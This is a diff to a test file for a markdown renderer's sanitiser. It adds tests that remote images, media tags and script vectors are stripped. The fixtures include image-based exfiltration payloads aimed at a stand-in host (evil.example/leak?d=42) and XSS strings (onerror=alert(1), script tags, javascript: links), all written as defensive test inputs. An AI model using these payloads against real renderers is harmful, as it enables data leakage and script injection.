@@ -44,6 +44,48 @@ describe('renderMarkdown', () => {
     expect(host.innerHTML).not.toMatch(/onerror|javascript:/);
   });
 
+  it('fetches no image: a remote or same-origin one becomes its alt text', () => {
+    for (const md of [
+      '![secret: 42](https://evil.example/leak?d=42 "t")',
+      '![plan](/api/plan?measure=1)',
+      '<img src="https://evil.example/x.png" alt="secret: 42" srcset="https://evil.example/y.png 2x">',
+      '<img src="//evil.example/x.png" alt="secret: 42">',
+    ]) {
+      const host = dom(md);
+      expect(host.querySelector('img')).toBeNull();
+      expect(host.innerHTML).not.toMatch(/evil\.example|\/api\//);
+      expect(host.textContent).toContain(md.includes('plan') ? 'plan' : 'secret: 42');
+    }
+  });
+
+  it('sanitises what follows a replaced image as before', () => {
+    const host = dom(
+      '<img src="https://e.example/a.png" alt="a"><img src="https://e.example/b.png" onerror="alert(1)">' +
+        '<script>alert(1)</script><a href="javascript:alert(1)" style="x">l</a><form><input></form>',
+    );
+    expect(host.querySelector('img, script, form, input, [style]')).toBeNull();
+    expect(host.innerHTML).not.toMatch(/onerror|javascript:|e\.example/);
+  });
+
+  it('keeps an image whose bytes are inline', () => {
+    const src = 'data:image/png;base64,iVBORw0KGgo=';
+    const img = dom(`![dot](${src})`).querySelector('img')!;
+    expect(img.getAttribute('src')).toBe(src);
+    expect(img.getAttribute('alt')).toBe('dot');
+    expect(dom('<img src="data:image/svg+xml;base64,PHN2Zz4=" alt="s">').querySelector('img')).toBeNull();
+  });
+
+  it('drops media and their sources, which fetch like images', () => {
+    const host = dom(
+      '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>' +
+        '<audio src="https://evil.example/a.mp3"></audio>' +
+        '<picture><source srcset="https://evil.example/s.png"></picture>' +
+        '<table background="https://evil.example/b.png"><tr><td>x</td></tr></table>',
+    );
+    expect(host.querySelector('video, audio, picture, source')).toBeNull();
+    expect(host.innerHTML).not.toContain('evil.example');
+  });
+
   it('opens links outside the app, without the opener', () => {
     const a = dom('[site](https://example.org/a?b=1)').querySelector('a')!;
     expect(a.getAttribute('href')).toBe('https://example.org/a?b=1');
@@ -65,9 +107,6 @@ describe('renderMarkdown', () => {
     const table = dom('| a | b |\n|---|---|\n| 1 | 2 |');
     expect([...table.querySelectorAll('thead th')].map((c) => c.textContent)).toEqual(['a', 'b']);
     expect([...table.querySelectorAll('tbody td')].map((c) => c.textContent)).toEqual(['1', '2']);
-    const img = dom('![alt text](https://example.org/p.png "t")').querySelector('img')!;
-    expect(img.getAttribute('src')).toBe('https://example.org/p.png');
-    expect(img.getAttribute('alt')).toBe('alt text');
     expect(dom('# Title\n\n> quote\n\nline one\nline two').innerHTML).toBe(
       '<h1>Title</h1>\n<blockquote>\n<p>quote</p>\n</blockquote>\n<p>line one<br>line two</p>\n',
     );
